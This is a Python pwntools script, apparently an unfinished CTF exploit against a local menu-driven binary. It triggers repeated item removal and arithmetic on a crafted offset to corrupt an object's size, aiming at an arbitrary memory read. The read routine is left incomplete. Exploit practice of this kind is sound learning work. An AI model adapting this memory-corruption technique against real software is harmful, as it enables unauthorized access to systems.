from pwn import *
import logging

context(arch = 'amd64', os = 'linux', log_level = logging.DEBUG)

proc = process('./array-7b01abf5d8c06b8a977e238a5c4ad1be')

def sendcmd(cmd):
    proc.recvuntil(': ')
    proc.sendline(cmd)

def new_c3():
    sendcmd('1')
    sendcmd('1')
    c3_id = proc.recvline(keepends=False)
    log.info('C3 Created: %s' % c3_id)

def c3_add_item(c3_id, vals):
    sendcmd('1')
    sendcmd('2')
    sendcmd(str(c3_id))
    sendcmd('1')
    sendcmd(str(len(vals)))
    for i in vals:
        sendcmd(str(i))
        log.info('Append %d to c3[%d]' %(i, c3_id))
    assert(proc.recvline(keepends=False) != '-1')

def c3_remove_item(c3_id):
    sendcmd('1')
    sendcmd('2')
    sendcmd(str(c3_id))
    sendcmd('4')
    log.info('Remove item from c3[%d]' % c3_id)
    assert(proc.recvline(keepends=False) != '-1')

def c3_item_sub(c3_id, dst, src):
    sendcmd('1')
    sendcmd('2')
    sendcmd(str(c3_id))
    sendcmd('7')
    sendcmd(str(dst))
    sendcmd(str(src))
    assert(proc.recvline(keepends=False) != '-1')

def c3_item_add(c3_id, dst, src):
    sendcmd('1')
    sendcmd('2')
    sendcmd(str(c3_id))
    sendcmd('8')
    sendcmd(str(dst))
    sendcmd(str(src))
    assert(proc.recvline(keepends=False) != '-1')

def new_c1(c3_id=0):
    sendcmd('1')
    sendcmd('5')
    sendcmd(str(c3_id))
    sendcmd('2')
    c1_id = proc.recvline(keepends=False)
    log.info('C1 Created: %s' % c1_id)

def c1_add_item(c1_id, vals):
    sendcmd('2')
    sendcmd('2')
    sendcmd(str(c1_id))
    sendcmd('1')
    sendcmd(str(len(vals)))
    for i in vals:
        sendcmd(str(i))
        log.info('Append %d to c1[%d]' %(i, c1_id))
    assert(proc.recvline(keepends=False) != '-1')

def c1_display(c1_id):
    sendcmd('2')
    sendcmd('4')
    sendcmd(str(c1_id))
    proc.recvuntil(': ')

read_c3 = 0
items_c3 = 6
items_offset = 9774
corrupted_c1 = 0
first_c3_item = 0x602EC0 + 0x10

def rewrite_c1_size(items):
    #c3_add_item(size_c3,[items])
    c3_item_sub(items_c3, items_offset, items_offset)
    c3_item_add(items_c3, items_offset, 0)
    #c3_remove_item(size_c3)

def read_qw(addr):
    c3_item_sub(read_c3, 0, 0)
    c3_i = (8 - (addr - first_c3_item)/8 * 3) % 8

#recv headers
proc.recvline()

# Initialize corrupted c1
log.info('Setting up corrupted item')

# First 8 c3 are used to read anywhere
for i in range(8):
    new_c3()
    c3_add_item(i, [0])
    c3_remove_item(i)
    c3_remove_item(i)

# Test
log.info('Exploit test')
rewrite_c1_size(5)
c1_display(corrupted_c1)

proc.close()
